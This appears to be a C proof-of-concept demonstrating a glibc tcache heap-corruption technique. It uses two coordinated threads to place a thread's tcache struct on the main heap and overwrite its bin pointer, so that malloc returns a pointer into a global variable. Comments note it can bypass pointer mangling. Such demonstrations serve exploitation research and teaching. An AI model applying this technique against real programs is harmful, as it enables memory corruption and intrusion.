#include <malloc.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Compile: `gcc poc.c -o poc -ggdb -pthread -no-pie`

/*
The flow of this program is REALLY janky and depends on how threads use each other.
So, this is super fun!

The goal is to allocate a different tcache struct onto the heap and corrupt this. 
In order to make this work, multiple threads are required with operations
happening in a specific order. To make this work, I've created a crappy 
mutex system. 

The flow of the program: 
1. Set the amount of allowed arenas to create to be 1. This forces the new thread to create a tcache struct in the main arenas heap.
2. Create the thread. This allocates a chunk onto the main threads heap. This is the *secondary* thread.
3. Create a chunk in the *main thread*. This will be directly behind the chunk for the tcache struct created in the next step.
4. Create a chunk in the *secondary* thread. This allocation will trigger the tcache struct for the thread to be created on our heap. 
5. Free the chunk created in the secondary heap. This will go to the current threads tcache bin.
6. Use the chunk from the *main thread* to overwrite data in the tcache struct. Namely, we want
to corrupt the singly linked list storage of the tcache. 
7. Allocate the chunk that points to the fake chunk. 
8. Boom :) Winner!


NOTES: 
- Instead of creating the chunk after the thread has been created (step 3), we could create a chunk that is in the unsorted bin that would fit this allocation size. However, this seemed easier than doing the heap feng shui. 
- For whatever reason, the usage of our fake chunk completely bricks this program when the thread exits. 
- With the ability to write NULLbytes, this can act as a bypass for the pointer mangling, since the tcache struct does not mangle the initial pointers. We can use a relative overwrite or write chunks directly into the .bss and LibC sections, without knowing the heap base. 
*/

int global_state_change = 0;

char important_string[0x20] = "You can't touch this"; 

void loop_until_good(int need){

	while(global_state_change != need){
		sleep(1);
	}
}

/*
Functionality for the main thread in the program
*/
void main_thread(){

	// Wait for the secondary thread to start
	loop_until_good(1);

	// Create the attacker chunk
	int* attack_ptr = malloc(0x20);

	// Tell the new thread to continue
	global_state_change = 2; 

	// Wait for the new tcache struct to be created
	loop_until_good(3);

	// Overwrite the tcache struct bin pointer
	attack_ptr[0xb0/ (sizeof(int))] = &important_string; 

	global_state_change = 4; 

	loop_until_good(5);	
}

/*
Functionality for the second thread in the program
*/
void secondary_thread(){

	// Tell main thread to allocate the chunk
	global_state_change = 1;

	// Wait for main thread to make the allocation
	loop_until_good(2);

	// Force the thread to allocate a new heap chunk for the tcache	
	int* trigger_tcache = malloc(0x10);
	free(trigger_tcache);

	// Tell main thread to do the overwrite
	global_state_change = 3; 

	// Wait for the main thread to corrupt the pointer in the tcache
	loop_until_good(4);

	// Return chunk of size 0x20 - Should be corrupted from the main thread
	char* victim_chunk = malloc(0x10);
	strcpy(victim_chunk, "Hit me with your best shot!\n"); 

	printf("Data inside my string: %s\n", important_string);

	global_state_change = 5;

	// Quit the thread without cleaning up
	// pthread_exit will crash the program here. Unsure why.
	exit(0);
}

int main(){

	setvbuf(stdout, NULL, _IONBF, 0);

	// Call mallopt in order to set the maximum number of arenas
	mallopt(M_ARENA_MAX, 1);

	// Return chunk of size 0x20 - To create the heap
	malloc(0x10);

	// Creating a single thread to do this attack against
	pthread_t threadId;
	pthread_create(&threadId, NULL, &secondary_thread, NULL);

	main_thread();
}
